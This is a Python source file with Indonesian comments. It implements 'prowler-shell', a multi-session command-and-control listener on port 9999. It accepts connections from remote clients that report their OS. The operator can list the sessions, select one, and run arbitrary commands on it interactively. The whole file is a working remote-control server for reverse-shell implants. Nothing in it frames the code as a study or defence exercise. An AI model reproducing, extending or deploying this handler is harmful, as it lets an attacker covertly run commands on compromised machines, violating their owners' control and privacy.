import socket
import sys
import threading
import time

HOST = '0.0.0.0'  # Mendengarkan di semua interface jaringan
PORT = 9999       # Port yang digunakan (pastikan port ini open di firewall kamu)

all_connections = []
all_addresses = []

def create_socket():
    try:
        global host
        global port
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as msg:
        print(sys.stderr, f"[-] Gagal membuat socket: {msg}")

def bind_socket():
    try:
        global host
        global port
        global s
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen(5)
        print(f"[*] Server mendengarkan di port {PORT}...")
    except socket.error as msg:
        print(sys.stderr, f"[-] Binding gagal: {msg}\nRetrying...")
        time.sleep(5)
        bind_socket()

def accepting_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)  # Mencegah timeout
            
            # Meminta informasi OS dari client saat pertama kali connect
            os_info = conn.recv(1024).decode("utf-8")
            
            all_connections.append(conn)
            all_addresses.append(address)
            
            print(f"\n[+] Sesi baru terhubung: {address[0]}:{address[1]} ({os_info})")
            print("prowler-shell> ", end="")
        except Exception as e:
            print(f"[-] Gagal menerima koneksi: {e}")
            break

def start_shell():
    while True:
        cmd = input("prowler-shell> ")
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        elif cmd == 'exit':
            print("[*] Menutup semua koneksi dan keluar...")
            for conn in all_connections:
                conn.close()
            s.close()
            sys.exit()
        else:
            print("[-] Perintah tidak dikenal. Gunakan 'list', 'select <id>', atau 'exit'")

def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode('ping'))
            conn.recv(2048)
        except Exception:
            del all_connections[i]
            del all_addresses[i]
            continue
        results += f" [{i}]   {all_addresses[i][0]}:{all_addresses[i][1]}\n"
    
    print("----- Client Aktif -----")
    print("ID    IP:PORT")
    print(results)

def get_target(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        conn = all_connections[target]
        print(f"[+] Terhubung ke {all_addresses[target][0]}")
        print("[!] Ketik 'back' untuk kembali ke menu utama server.")
        return conn
    except Exception:
        print("[-] Pilihan target tidak valid.")
        return None

def send_target_commands(conn):
    # Bersihkan buffer ping lama jika ada
    conn.settimeout(2)
    try:
        conn.recv(1024)
    except socket.timeout:
        pass
    conn.settimeout(None)

    while True:
        try:
            cmd = input("remote> ")
            if cmd == 'back':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                # Menerima respons berukuran besar dengan perulangan
                client_response = conn.recv(4096).decode("utf-8")
                print(client_response, end="")
        except Exception as e:
            print(f"[-] Sesi terputus: {e}")
            break

def main():
    create_socket()
    bind_socket()
    
    t = threading.Thread(target=accepting_connections)
    t.daemon = True
    t.start()
    
    start_shell()

if __name__ == '__main__':
    main()
